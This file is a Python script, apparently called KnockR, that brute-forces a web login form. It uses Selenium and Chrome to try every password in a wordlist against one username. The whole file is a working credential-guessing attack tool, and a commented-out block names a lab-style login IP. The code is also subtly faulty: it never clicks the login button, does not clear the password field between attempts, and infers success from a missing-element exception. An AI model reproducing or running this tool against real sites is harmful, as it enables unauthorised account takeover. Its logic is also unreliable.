#!/usr/bin/env python3

import sys
from requests.api import get
import selenium
import requests
import time
from selenium import webdriver
import argparse
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

# Initiation
username = None
usr_sel = None
pass_sel = None
button_sel = None
word_list = None 
url = None
delay = None

gotit = False

#Colors
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   END  = '\33[37m'


# Arguments
parser = argparse.ArgumentParser()
parser.add_argument("-p", "--pasel", dest="password_selector",help="Specify the password selector")
parser.add_argument("-l", "--usrsel", dest="username_selector",help="Specify the username selector")
parser.add_argument("-b", "--buttonsel", dest="login_button_selector",help= "Specify the login button selector")
parser.add_argument("-d", "--delay", dest="delay",help="Specify a delay")
requiredNamed = parser.add_argument_group('required named arguments')
requiredNamed.add_argument("-s", "--url", dest="url",help="Specify a url", required=True)
requiredNamed.add_argument("-u", "--username", dest="username",help="Specify the username", required=True)
requiredNamed.add_argument("-w", "--wordlist", dest="wordlist",help="Specify the password list directory", required=True)
requiredNamed.add_argument("-c", "--chromedriver", dest="chromedriver",help="Specify the path to chrome driver", required=True)

args = parser.parse_args()

def get_request():
    global gotit
    try:
        request_1 = requests.get(url)
        gotit = True
        return request_1
    except:
        pass

def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
    sys.stdout.write(color.DARKCYAN+'\n[~] '+ 'Checking if URL is reachable... '+color.END)
    sys.stdout.flush()
    try:
        get_request()
        time.sleep(5)
        if not gotit:
            print (color.RED+'[X]'+color.END)
            print (color.RED+'[!]'+ ' Website unreachable'+color.END)
            exit()
        else:
            if get_request().status_code == 200:
                print (color.GREEN+'[OK]'+color.END)
                sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print (color.END+'\n[!] '+ 'User interrupt'+color.END)
        sys.exit(0)
        
    f = open(word_list, 'r')
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    driver = webdriver.Chrome(service = Service(chromedriver))
    print (color.GREEN+'[*] Starting dictionary attack against '+username+' with a '+delay+' seconds'+' delay\n'+color.END)
    for passwd in f:
        try:
            driver.get(url)
            Sel_user = driver.find_element(By.CSS_SELECTOR, usr_sel)
            Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
            driver.find_element(By.CSS_SELECTOR, button_sel)
            Sel_user.send_keys(username)
            print('[~] Attempting password '+ color.YELLOW+passwd+color.END, end='')
            Sel_pas.send_keys(passwd)
            time.sleep(int(delay))
            final_pass = passwd

            # Get status_code using Javascript (Doesn't work yet)

            # js = '''
            # let callback = arguments[0];
            # let xhr = new XMLHttpRequest();
            # xhr.open('GET', ' '''+str(url)+''' ', 'http://10.10.203.148/login', true);
            # xhr.onload = function () {
            #     if (this.readyState === 4) {
            #         callback(this.status);
            #     }
            # };
            # xhr.onerror = function () {
            #     callback('error');
            # };
            # xhr.send(null);
            # '''

            # status_code = driver.execute_async_script(js)
            # print(status_code) 

        except KeyboardInterrupt:
            print (color.END+'\n[!]'+ 'User interrupt'+color.END)
            sys.exit(0)
        except selenium.common.exceptions.NoSuchElementException:
            print(color.GREEN+'\n[+] Password found: ['+final_pass+']'+color.END)
            sys.exit(0)

def banner():
    banner = color.BOLD+'''
{0} _  __                     _     ____  
{0}| |/ / _ __    ___    ___ | | __|  _ \ 
{2}| ' / | '_ \  / _ \  / __|| |/ /| |_) |
{2}| . \ | | | || (_) || (__ |   < |  _ < 
{2}|_|\_\|_| |_| \___/  \___||_|\_\|_| \_\\
              {3}by kod34
                        
'''.format(color.PURPLE, color.END, color.GREEN, color.RED, color.BLUE, color.DARKCYAN, color.CYAN)
    print(banner+color.END)


banner()
username = args.username
usr_sel = args.username_selector
pass_sel = args.password_selector
button_sel = args.login_button_selector
url = args.url
word_list = args.wordlist
chromedriver = args.chromedriver
delay = args.delay

if usr_sel == None:
    usr_sel = input('Uername selector: '+color.END)
if pass_sel == None:    
    pass_sel = input('Password selector: '+color.END)
if button_sel == None:
    button_sel = input('Login button selector: '+color.END)
if delay == None:
    delay = input('Delay: '+color.END)
brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay)